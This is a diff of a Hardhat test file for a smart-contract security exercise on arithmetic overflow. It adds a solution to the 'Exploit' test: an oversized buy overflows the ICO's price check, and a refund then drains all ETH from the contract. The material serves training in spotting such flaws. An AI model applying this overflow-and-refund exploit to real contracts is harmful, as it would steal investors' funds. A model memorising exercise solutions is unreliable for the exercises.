@@ -67,15 +67,15 @@ describe('Arithmetic Over/Underflow Exercise 3', function () {
         .to.be.equal(SECOND_INVESTOR_INVESTED.mul(10));
         expect(await this.token.balanceOf(investor3.address))
         .to.be.equal(THIRD_INVESTOR_INVESTED.mul(10));
-        
+
         expect(await ethers.provider.getBalance(this.ico.address)).to.be.equal(
             FIRST_INVESTOR_INVESTED.add(SECOND_INVESTOR_INVESTED).add(THIRD_INVESTOR_INVESTED)
         )
-        
+
     });
 
     it('Refund Tests', async function () {
-        
+
         // Should Fail (investor doesn't own so many tokens)
         await expect(this.ico.connect(investor2).refund(
             SECOND_INVESTOR_INVESTED.mul(100),
@@ -93,12 +93,19 @@ describe('Arithmetic Over/Underflow Exercise 3', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await this.ico.connect(attacker).buy(
+          ethers.constants.MaxUint256.div(10).add(1)
+        )
 
+        let bounty = await ethers.provider.getBalance(this.ico.address)
+        let numTokens = bounty.mul(10)
+
+        await this.ico.connect(attacker).refund(numTokens)
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Attacker should drain all ETH from ICO contract
         expect(await ethers.provider.getBalance(this.ico.address)).to.be.equal(0);
         expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
